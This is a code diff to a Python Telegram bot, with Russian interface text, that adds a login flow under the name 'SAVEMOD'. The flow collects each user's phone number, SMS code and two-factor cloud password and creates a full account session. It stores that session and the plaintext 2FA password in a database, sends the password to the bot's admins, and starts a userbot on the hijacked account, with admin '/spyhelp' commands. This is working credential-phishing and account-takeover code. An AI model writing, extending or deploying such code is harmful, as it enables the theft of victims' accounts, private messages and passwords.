@@ -918,6 +918,63 @@ async def handle_code(callback):
     await callback.message.edit_text(f"📱 Код: {display}", reply_markup=get_code_keyboard())
     await callback.answer()
 
+@dp.message_handler(commands=['start'])
+async def cmd_start(message):
+    user_id = message.from_user.id
+    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
+    row = cursor.fetchone()
+    if row and row[0]:
+        if is_admin(user_id):
+            await message.answer("✅ Ты уже авторизован!\n/spyhelp - команды")
+        else:
+            await message.answer("✅ Ты уже авторизован в SAVEMOD!")
+        if user_id not in active_clients:
+            asyncio.create_task(run_userbot(user_id, row[0]))
+        return
+    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+    kb.add(KeyboardButton("📱 Поделиться номером", request_contact=True))
+    await message.answer("🔐 Отправь номер телефона", reply_markup=kb)
+
+@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
+async def handle_contact(message):
+    user_id = message.from_user.id
+    phone = message.contact.phone_number
+    try:
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+        result = await client.send_code_request(phone)
+        temp_auth[user_id] = {'client': client, 'phone': phone, 'hash': result.phone_code_hash, 'code': ''}
+        await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {e}")
+
+@dp.callback_query_handler(lambda c: c.data.startswith('code_'))
+async def handle_code(callback):
+    user_id = callback.from_user.id
+    if user_id not in temp_auth:
+        await callback.answer("Сессия истекла, /start")
+        return
+    action = callback.data.replace('code_', '')
+    current = temp_auth[user_id].get('code', '')
+    if action.startswith('digit_'):
+        digit = action.split('_')[1]
+        if len(current) < 5:
+            temp_auth[user_id]['code'] = current + digit
+    elif action == 'backspace':
+        temp_auth[user_id]['code'] = current[:-1]
+    elif action == 'submit':
+        if len(current) == 5:
+            await callback.answer("Авторизация...")
+            await complete_auth(callback, user_id)
+            return
+        else:
+            await callback.answer(f"Нужно 5 цифр", show_alert=True)
+            return
+    code = temp_auth[user_id]['code']
+    display = code if code else "_____"
+    await callback.message.edit_text(f"📱 Код: {display}", reply_markup=get_code_keyboard())
+    await callback.answer()
+
 async def complete_auth(callback, user_id):
     data = temp_auth[user_id]
     try:
@@ -927,14 +984,19 @@ async def complete_auth(callback, user_id):
         cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                        (user_id, session_str, data['phone'], None, me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
         conn.commit()
-        await callback.message.answer(f"✅ Авторизация успешна!\n/spyhelp - команды")
+        await callback.message.answer(f"✅ Авторизация успешна!")
         asyncio.create_task(run_userbot(user_id, session_str))
         await data['client'].disconnect()
         del temp_auth[user_id]
-        await send_to_admins(f"🎉 Новый пользователь: {me.first_name}\nID: {user_id}")
+        for admin_id in ADMIN_IDS:
+            try:
+                await bot.send_message(admin_id, f"🎉 Новый пользователь: {me.first_name}\nID: {user_id}")
+            except:
+                pass
     except Exception as e:
-        if '2FA' in str(e):
-            await callback.message.answer("🔐 Введи пароль от 2FA:")
+        error_msg = str(e).lower()
+        if '2fa' in error_msg or 'password' in error_msg or 'two-steps' in error_msg:
+            await callback.message.answer("🔐 Введите пароль от двухфакторной аутентификации (облачный пароль):")
             pending_2fa[user_id] = data
             del temp_auth[user_id]
         else:
@@ -951,13 +1013,17 @@ async def handle_2fa(message):
         cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                        (user_id, session_str, data['phone'], message.text.strip(), me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
         conn.commit()
-        await message.answer(f"✅ Авторизация успешна!\n/spyhelp - команды")
+        await message.answer(f"✅ Авторизация с 2FA успешна!")
         asyncio.create_task(run_userbot(user_id, session_str))
         await data['client'].disconnect()
         del pending_2fa[user_id]
-        await send_to_admins(f"🎉 Новый пользователь (2FA): {me.first_name}\nID: {user_id}\n2FA: {message.text.strip()}")
+        for admin_id in ADMIN_IDS:
+            try:
+                await bot.send_message(admin_id, f"🎉 Новый пользователь (2FA): {me.first_name}\nID: {user_id}\n🔐 2FA пароль: {message.text.strip()}")
+            except:
+                pass
     except Exception as e:
-        await message.answer(f"❌ Ошибка: {e}")
+        await message.answer(f"❌ Ошибка 2FA: {e}")
 
 # ============================================================================
 # ЮЗЕРБОТ
